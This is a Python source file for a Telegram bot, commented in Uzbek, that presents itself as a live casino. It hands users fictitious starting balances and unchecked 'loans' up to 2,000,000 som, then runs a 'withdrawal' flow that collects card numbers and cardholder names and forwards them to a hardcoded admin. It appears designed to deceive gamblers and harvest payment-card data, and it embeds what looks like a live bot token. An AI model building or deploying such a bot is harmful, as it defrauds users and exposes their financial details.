import telebot
from telebot import types
import time

# --- SOZLAMALAR ---
# Siz bergan yangi token va rasmdagi admin ID
TOKEN = '8609558089:AAExgvs1_XR5jlj9RGC55zZStvc7nV_Z6hE' 
ADMIN_ID = 5988166567 
bot = telebot.TeleBot(TOKEN)

# Foydalanuvchi ma'lumotlarini vaqtinchalik xotirada saqlash
users = {}

def get_user(user_id):
    if user_id not in users:
        # Boshlang'ich balans va holatlar
        users[user_id] = {'balance': 50000, 'loan': 0, 'card': '', 'name': ''}
    return users[user_id]

# --- ASOSIY MENYU ---
def main_markup():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("🎰 O'yinlar", "💰 Balans")
    markup.add("💳 Pul yechish", "💸 Nasiya olish")
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    get_user(message.chat.id)
    bot.send_message(message.chat.id, "💎 Live Kazino botiga xush kelibsiz!", reply_markup=main_markup())

# --- 1. NASIYA (QARZ) OLISH TIZIMI ---
@bot.message_handler(func=lambda message: message.text == "💸 Nasiya olish")
def loan_start(message):
    msg = bot.send_message(message.chat.id, "Summani kiriting (Maks: 2,000,000 s):")
    bot.register_next_step_handler(msg, process_loan)

def process_loan(message):
    try:
        amount = int(message.text)
        if amount > 2000000:
            bot.send_message(message.chat.id, "Maksimal qarz - 2,000,000 so'm!")
            return
        user = get_user(message.chat.id)
        user['balance'] += amount
        user['loan'] += amount
        bot.send_message(message.chat.id, f"✅ Qarz berildi: {amount:,} s\nBalans: {user['balance']:,} s")
    except:
        bot.send_message(message.chat.id, "Iltimos, faqat raqam kiriting!")

# --- 2. O'YINLAR TIZIMI (XAVFSIZ VA QIZIQARLI) ---
@bot.message_handler(func=lambda message: message.text == "🎰 O'yinlar")
def games(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🎲 Kubik", callback_data="game_dice"))
    markup.add(types.InlineKeyboardButton("🏀 Basketbol", callback_data="game_basket"))
    bot.send_message(message.chat.id, "O'yinni tanlang (Stavka: 5,000 s):", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("game_"))
def play_game(call):
    user = get_user(call.message.chat.id)
    if user['balance'] < 5000:
        bot.answer_callback_query(call.id, "Mablag' yetarli emas!")
        return
    user['balance'] -= 5000
    emoji = '🎲' if 'dice' in call.data else '🏀'
    game = bot.send_dice(call.message.chat.id, emoji=emoji)
    time.sleep(4)
    if game.dice.value >= 4:
        user['balance'] += 10000
        bot.send_message(call.message.chat.id, f"🎉 Yutdingiz! Balans: {user['balance']:,} s")
    else:
        bot.send_message(call.message.chat.id, f"😟 Yutqazdingiz. Balans: {user['balance']:,} s")

# --- 3. PUL YECHISH ZANJIRI (UXLAB QOLMAYDIGAN) ---
@bot.message_handler(func=lambda message: message.text == "💳 Pul yechish")
def withdraw_step1(message):
    msg = bot.send_message(message.chat.id, "1. Karta raqamingizni yozing:", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, withdraw_step2)

def withdraw_step2(message):
    user = get_user(message.chat.id)
    user['card'] = message.text
    msg = bot.send_message(message.chat.id, "2. Karta egasining ism va familiyasini yozing:")
    bot.register_next_step_handler(msg, withdraw_step3)

def withdraw_step3(message):
    user = get_user(message.chat.id)
    user['name'] = message.text
    msg = bot.send_message(message.chat.id, "3. Qancha yechmoqchisiz? (Summani kiriting):")
    bot.register_next_step_handler(msg, withdraw_final)

def withdraw_final(message):
    user = get_user(message.chat.id)
    amount = message.text
    # Adminga tasdiqlash tugmalari bilan yuborish
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ Pul tushdi", callback_data=f"pay_ok_{message.chat.id}"),
               types.InlineKeyboardButton("❌ Pul tushmadi", callback_data=f"pay_no_{message.chat.id}"))
    
    admin_msg = (f"🚀 **Yangi so'rov!**\n\n👤 Ism: {user['name']}\n💳 Karta: `{user['card']}`\n💰 Summa: {amount} s")
    bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown", reply_markup=markup)
    bot.send_message(message.chat.id, "✅ Adminga yuborildi. Kuting...", reply_markup=main_markup())

# --- 4. XAVFSIZLIK: ADMIN JAVOBI ---
@bot.callback_query_handler(func=lambda call: call.data.startswith("pay_"))
def admin_answer(call):
    _, action, uid = call.data.split("_")
    if action == "ok":
        bot.send_message(uid, "✅ To'lovingiz tasdiqlandi! Pul tushdi.")
        bot.edit_message_text(call.message.text + "\n\n🟢 **TASDIQLANDI**", call.message.chat.id, call.message.message_id)
    else:
        bot.send_message(uid, "❌ To'lovingiz rad etildi. Pul tushmadi.")
        bot.edit_message_text(call.message.text + "\n\n🔴 **RAD ETILDI**", call.message.chat.id, call.message.message_id)

@bot.message_handler(func=lambda message: message.text == "💰 Balans")
def check_bal(message):
    user = get_user(message.chat.id)
    bot.send_message(message.chat.id, f"💰 Balans: {user['balance']:,} s\n💸 Qarz: {user['loan']:,} s")

# Railway uchun barqaror ishga tushirish
bot.polling(none_stop=True)

       

    
            
        
        
    
  
